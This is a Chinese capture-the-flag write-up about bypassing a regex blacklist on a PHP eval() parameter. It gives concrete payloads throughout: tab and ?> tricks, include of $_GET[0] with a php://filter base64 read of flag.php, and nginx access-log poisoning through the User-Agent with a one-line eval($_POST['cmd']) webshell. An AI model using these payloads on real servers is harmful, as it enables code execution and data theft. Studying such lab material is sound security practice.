要求GET传参传入参数c 正则匹配过滤了flag system php cat sort shell 点号、空格、单引号、双引号、反引号、分号和左括号
构造payload:/?c=include%09"/fla*"?>
因为左括号被禁用 所以尝试文件包含 避开括号 语法include 文件名;
因为空格被禁用 所以用tab键的url编码 %09
因为分号被禁用 所以用 ?>来结束当前的PHP语句

但是行不通 问题出在通配符 include是PHP的语言结构 不是Shell命令 即PHP的文件操作函数不支持通配符 它们只接受具体的文件路径

方法1

使用文件包含的同时加上php伪协议
/?c=include%09$_GET[0]?>&0=php://filter/convert.base64-encode/resource=flag.php
$_GET 是一个数组，内容是URL 中所有GET参数组成的键值对
[0] 表示键名为 0 的数组元素
注意:$_GET是关联数组 所以[0]只是键名为0的元素，与位置无关，区别于索引数组
并且数字键名不需要引号 整体实现了获取URL中参数 0 的值 避免使用引号
?>PHP结束标签
& 分隔多个GET参数 即c和0
0= 定义参数名为 0 对应PHP中的 $_GET[0]

php://filter/convert.base64-encode/resource=这是PHP伪协议 读取文件内容并以Base64编码输出
拆解:
php://PHP 内置的伪协议
filter表示使用过滤器功能
/convert.base64-encode过滤器名称 作用：把文件内容转换为 Base64 编码
/resource=指定要处理的文件路径

整体执行逻辑：
1.PHP将URL中的参数解析成 $_GET 数组
$_GET['c'] = 'include%09$_GET[0]?>'
$_GET[0] = 'php://filter/convert.base64-encode/resource=flag.php'
2.eval() 执行 c 参数的内容
eval('include%09$_GET[0]?>');
3.$_GET[0] 被替换成 flag.php include 'flag.php'; 4.执行include ‘flag.php’;`
解码得到flag

这是已知flag位置的前提下 可以使用这个方法

方法二

如果在不知道flag的位置的前提下 需要使用文件包含+日志注入的方式
判断是否能日志注入：尝试包含日志文件看是否能读取内容
首先抓包看看 得到服务器为nginx

/var/log/nginx/access.log是nginx默认的access日志路径
所以和上一个payload的大体格式一样构造，只是将静态的读取文件变成了动态的包含日志，执行其中的PHP代码
/?c=include%09$_GET[0]?>&0=/var/log/nginx/access.log

这个payload的执行过程如下：
1.PHP将URL中的参数解析成 $_GET 数组
$_GET['c'] = 'include%09$_GET[0]?>'; $_GET[0] = ‘/var/log/nginx/access.log’;
2.eval() 执行 c 参数的内容
eval('include%09$_GET[0]?>');
3.$_GET[0] 被替换成 /var/log/nginx/access.log include '/var/log/nginx/access.log';
4.执行include '/var/log/nginx/access.log';
整个过程纯文本输出，没有任何PHP代码被执行
返回包里面包含了所有的攻击尝试记录 说明include 成功执行 日志文件被包含

下一步修改UA把一句话木马存进服务器的日志文件里，然后通过包含日志文件来执行代码
一句话木马<?php @eval($_POST['cmd']); ?>
写一句话木马的作用:
凡是从POST参数里传入 cmd ，都把它当成PHP代码执行，然后把结果返回
选择修改UA的原因：
1.Nginx默认记录每个请求的UA到访问日志
2.UA内容完全可控
3.UA内容不会被过滤

写入后用蚁剑连接(蚁剑自动化、图形化、批量化地完成POST传参过程)
注意：HTTPS可能有证书验证问题或端口限制 所以一开始用https连接失败 改成http才可以

得到flag
